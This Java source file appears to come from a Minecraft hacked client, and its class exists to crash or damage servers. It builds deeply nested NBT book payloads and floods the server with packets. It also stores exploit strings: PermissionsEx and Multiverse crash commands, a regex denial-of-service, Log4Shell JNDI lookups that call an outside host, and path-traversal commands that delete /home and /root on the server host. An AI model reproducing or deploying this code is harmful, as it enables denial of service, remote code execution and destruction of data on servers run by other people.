package cn.loli.client.utils;

import cn.loli.client.Main;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

public class CrashUtils {


    public String[] unicode = {"م",
            "⾟", "✈", "龜", "樓", "ᳱ", "ᳩ", "ᳫ", "ᳬ", "᳭", "ᳮ", "ᳯ", "ᳰ", "⿓", "⿕",
            "⿔", "\uD803\uDE60", "\uD803\uDE65", "ᮚ", "ꩶ", "꩷", "㉄", "Ὦ", "Ἇ", "ꬱ",
            "ꭑ", "ꭐ", "\uAB67", "ɸ", "Ａ", "\u007F"}; //31

    public String lpx = "...................................................Ѳ2.6602355499702653E8"; //12;

    public String netty = ".........................................................................................................................." +
            "..........................................................................................................................................." +
            "..........................................................................................................................................." +
            "..........................................................................................................................................." +
            "............................................................................................................................................" +
            "..........................................................................................................................................." +
            "..........................................................................................................................................." +
            "..........................................................................................................................................." +
            "............................................................................................................................................." +
            "............................................................................................................................................." +
            "............................................................................................................................................." +
            "..............................................................................................................................................." +
            ".............................................................................................................................................." +
            "....................................................................................................................................................."; //12


    String[] buffertype = {"MC|BSign", "MC|BEdit", "MC|BOpen"};

    public String pexcrashexp1 = "/pex promote a a";
    public String pexcrashexp2 = "/pex promote b b";
    public String mv = "/Mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^";
    public String fawe = "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}";
    public String pdw = "{\"petya.exe\":\"${jndi:rmi://du.pa}\"}}";

    public String pdw2 = "{\"petya.exe\":\"${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}\"}}";


    public String[] oldmv = {"/mv import ../../../../../home normal -t flat",
            "/mv import ../../../../../root normal -t flat",
            "/mv delete ../../../../../home",
            "/mv confirm",
            "/mv delete ../../../../../root",
            "/mv confirm"};


    public String AlphabeticRandom(int count) {
        return RandomStringUtils.randomAlphabetic(count);
    }

    public String NumberRandom(int count) {
        return RandomStringUtils.randomNumeric(count);
    }

    public String AsciirRandom(int count) {
        return RandomStringUtils.randomAscii(count);
    }

    public void oneblockcrash(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
                (new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - new Random().nextFloat() - 1.0f, Minecraft.getMinecraft().thePlayer.posZ)
                        , new Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f));
    }

    public void payload1(ItemStack stack) {
        String channel;
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        channel = "MC|BEdit";

        System.out.println(channel);
        Main.INSTANCE.packetQueue.add(new C17PacketCustomPayload(channel, packetBuffer));
    }

    public void payload2(ItemStack stack) {
        String channel;
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        channel = buffertype[ThreadLocalRandom.current().nextInt(1)];
        Main.INSTANCE.packetQueue.add(new C17PacketCustomPayload(channel, packetBuffer));
    }

    public void creatandpayload(ItemStack stack) {
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        Main.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(36, stack));
        Main.INSTANCE.packetQueue.add(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
    }

    public void creatandplace(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(36, stack));
        Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
                (new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - new Random().nextFloat() - 1.0f, Minecraft.getMinecraft().thePlayer.posZ)
                        , new Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f));
    }

    public void click(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C0EPacketClickWindow
                (0, Integer.MIN_VALUE, 0, 0, stack, (short) 0));
    }

    public void creatandclick(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(36, stack));
        Main.INSTANCE.packetQueue.add(new C0EPacketClickWindow(0, Integer.MIN_VALUE, 0, 3, stack, (short) 0));
    }

    public void justcreate(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction
                (36, stack));
    }

    public void custombyte(int amount) {
        double x = Minecraft.getMinecraft().thePlayer.posX, y = Minecraft.getMinecraft().thePlayer.posY, z = Minecraft.getMinecraft().thePlayer.posZ;
        for (int j = 0; j < amount; j++) {
            double i = ThreadLocalRandom.current().nextDouble(0.4, 1.2);
            if (y > 255) y = 255;
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, false));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
        }
    }

    public void crashdemo(String sign, int booktype, int bookvalue, int redo, boolean customedit, CrashType type, int amount, boolean setTag, int resolvebyte) {
        int size;
        NBTTagCompound compound = new NBTTagCompound();
        NBTTagList tagList = new NBTTagList();
        StringBuilder builder = new StringBuilder();

        Item hold;

        switch (booktype) {
            case 0:
                hold = Items.writable_book;
                break;
            case 1:
                hold = Items.book;
                break;
            case 2:
            default:
                hold = Items.written_book;
        }

        if (customedit) {
            builder.append(sign);
        } else {
            builder.append("{");
            for (size = 0; size < bookvalue; ++size) {
                builder.append("extra:[{");
            }
            for (size = 0; size < bookvalue; ++size) {
                builder.append("text:").append(sign).append("}],");
            }
            builder.append("text:").append(sign).append("}");
        }

        for (size = 0; size < redo; ++size)
            tagList.appendTag(new NBTTagString(builder.toString()));

        compound.setString("author", Minecraft.getMinecraft().getSession().getUsername());
        compound.setString("title", "Theresa-Cute" + AlphabeticRandom(2));
        compound.setByte("resolved", (byte) resolvebyte);
        compound.setTag("pages", tagList);


        ItemStack stack = new ItemStack(hold);
        stack.setTagCompound(compound);

        if (setTag)
            stack.setTagInfo("pages", tagList);


        int packet = 0;


        while (packet++ < amount) {
            switch (type) {
                case PLACE:
                    oneblockcrash(stack);
                    break;
                case CLICK:
                    click(stack);
                    break;
                case PAYLOAD1:
                    payload1(stack);
                    break;
                case PAYLOAD2:
                    payload2(stack);
                    break;
                case CAP:
                    creatandplace(stack);
                    break;
                case CAC:
                    creatandclick(stack);
                    break;
                case CAPL:
                    creatandpayload(stack);
                    break;
                case CREATE:
                    justcreate(stack);
                    break;
            }
        }
    }

    public void actioncrash(int amount) {
        int init = 0;
        while (init < amount) {
            Main.INSTANCE.packetQueue.add(new C0APacketAnimation());
            init++;
        }
    }


    public enum CrashType {
        PLACE, CLICK, PAYLOAD1, PAYLOAD2, CAP, CAC, CAPL, CREATE, SIGN
    }


    //TODO: GUI For Crasher // Netty Crasher // Non - Burst Crasher // Multi Tags Crasher // Non Book Make Crasher
    //PlayerUtil.debug(Main.INSTANCE.aesUtil.AESEncode(String.valueOf(packetBuffer))); Thread.sleep(delay);


}
